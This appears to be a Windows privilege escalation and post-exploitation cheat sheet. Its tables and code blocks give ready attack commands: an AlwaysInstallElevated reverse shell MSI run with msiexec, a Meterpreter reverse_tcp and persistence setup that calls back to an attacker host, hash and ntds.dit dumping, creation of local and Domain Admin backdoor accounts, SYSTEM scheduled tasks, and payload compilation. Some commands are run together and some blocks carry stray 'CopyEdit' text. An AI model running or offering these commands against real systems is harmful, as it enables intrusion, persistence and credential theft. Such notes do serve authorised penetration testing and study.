### 🧭 **Initial Enumeration**

| Category | Command/Tool | Notes |
| --- | --- | --- |
| **Domain Enum (if joined)** | `BloodHound / SharpHound` | Run via `Invoke-BloodHound -CollectionMethod All -Domain <domain>` |
| **Current User** | `whoami`, `echo %username%` | `whoami /groups` → Group membership |
| **Privileges** | `whoami /priv` | Look for `SeImpersonate`, `SeAssignPrimaryToken`, etc. |
| **System Info** | `systeminfo` | Look for hotfixes, uptime, domain, arch |
|  | `wmic os get Caption,CSDVersion,OSArchitecture,Version` | Less verbose alternative to `systeminfo` |
| **Services** | `wmic service get name,startname`, `net start` | Look for custom services or weak paths |
| **Admin Check** | `net localgroup administrators`, `net user` | Verify if current user is in admin group |
| **Network** | `netstat -anoy` | Show ports, PIDs, state |
|  | `route print`, `arp -A`, `ipconfig /all` | Check routing, ARP cache, DNS, gateways |
| **Users** | `net users`, `net user <name>`, `net localgroup` | Look for unused accounts, role abuse |
| **Firewall** | `netsh advfirewall firewall show rule name=all` | Look for open ports allowed in/out |
| **Scheduled Tasks** | `schtasks /query /fo LIST /v > schtasks.txt` | Use `taskschd.msc` GUI (if accessible) for quicker analysis |

---

### 🔐 **Installation Rights (AlwaysInstallElevated)**

```bash
bash
CopyEdit
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```

> 💥 If both are 0x1, build a reverse shell MSI and execute via:
> 

```bash
bash
CopyEdit
msiexec /quiet /qn /i evil.msi

```

---

### 📚 **Windows Privilege Escalation PoCs (by Se*Privilege)**

| Privilege | GitHub PoC |
| --- | --- |
| **SeImpersonatePrivilege** | ⭐ [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |
| **SeDebugPrivilege** | [SeDebugExploit](https://github.com/bruno-1337/SeDebugPrivilege-) |
| **SeAssignPrimaryToken / SeIncreaseQuota / SeSystemEnvironment / SeMachineAccount** | [HackTricks](https://github.com/b4rdia/HackTricks) |
| **SeTcb / SeCreateToken / SeTakeOwnership / SeRestore** | [token-priv](https://github.com/hatRiot/token-priv) |
| **SeLoadDriver** | [SeLoadDriver PoC](https://github.com/k4sth4/SeLoadDriverPrivilege) |
| **SeBackup / SeRelabel / SeManageVolume** | [CsEnox Exploit](https://github.com/CsEnox/SeManageVolumeExploit) |
| **SeTrustedCredManAccess** | [MS Docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) |

🔍 Use `whoami /priv` to check what you have.

if youre NT/System use `lusrmgr.msc` to change user passwords

---

### 🧪 **Maintaining Access – Meterpreter Examples**

| Task | Command |
| --- | --- |
| **Reverse Shell Setup** | `set PAYLOAD windows/meterpreter/reverse_tcpset LHOST`, `LPORT`, then `exploit` |
| **Persistence** | `run persistence -U -i 5 -p 443 -r <LHOST>` |
| **Port Forwarding** | `portfwd add -l 3306 -p 3306 -r <target_ip>` |
| **Process Migration** | `run post/windows/manage/migrate`, `migrate <PID>` |
| **Run Custom Payloads** | `powershell.exe "C:\Tools\privesc.ps1"` |

---

### 🧰 **Privilege Escalation Checklist**

| Category | Command/Tip |
| --- | --- |
| **Unquoted Service Paths** | `wmic service get name,displayname,pathname,startmode |
| **Weak Service Permissions** | `accesschk.exe -uwcqv <service>sc qc <service>icacls C:\Path\To\Service.exe` |
| **Clear Text Credentials** | `findstr /si password *.txt *.xml *.inidir /s *cred* *pass* *.config*` |
| **Weak File Permissions** | `accesschk.exe -uwqs Users c:\*.*accesschk.exe -uwqs "Authenticated Users" c:\*.*` |
| **Add Local Admin** | `net user siren P@ssw0rd! /addnet localgroup administrators siren /add` |
| **Add Domain Admin** | `net group "Domain Admins" siren /add /domain` |
| **File Transfers** | `certutil.exe`, `powershell (IEX)`, `tftp`, `ftp`, `python -m http.server`, SMB |

---

### 📅 **Scheduled Task Abuse**

| Action | Command |
| --- | --- |
| **Enumerate** | `schtasks /query /fo LIST /v > tasks.txt` |
| **Create** | `schtasks /create /ru SYSTEM /sc MINUTE /mo 5 /tn RUNME /tr "C:\Tools\sirenMaint.exe"` |
| **Run Now** | `schtasks /run /tn "RUNME"` |

---

### 🔍 **Post-Exploitation Enumeration**

| Action | Command |
| --- | --- |
| **Network Users** | `net user`, `net localgroup administrators`, `net user <target>` |
| **Access Checks** | `accesschk.exe /accepteula`, `whoami`, `groups` |
| **Dump Hashes** | `meterpreter > hashdump` |
| **Dump ntds.dit** | `secretsdump.py` or disk copy via VSS |
| **Share Enumeration** | `net share`, `net use`, `net use Z: \\TARGET\SHARE /persistent:yes` |

---

### 🧪 **Tools & Resources**

| Tool | Purpose |
| --- | --- |
| [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) | Offline patch diff checker |
| [FuzzySecurity Priv Esc Guide](https://www.fuzzysecurity.com/tutorials/16.html) | Popular escalation reference |
| [HackTricks Windows Priv Esc](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation) | Modern, up-to-date tricks |
| `mingw-w64` | Compile Windows payloads on Linux:`x86: i686-w64-mingw32-gcc shell.c -o shell.exex64: x86_64-w64-mingw32-gcc shell.c -o shell64.exe` |
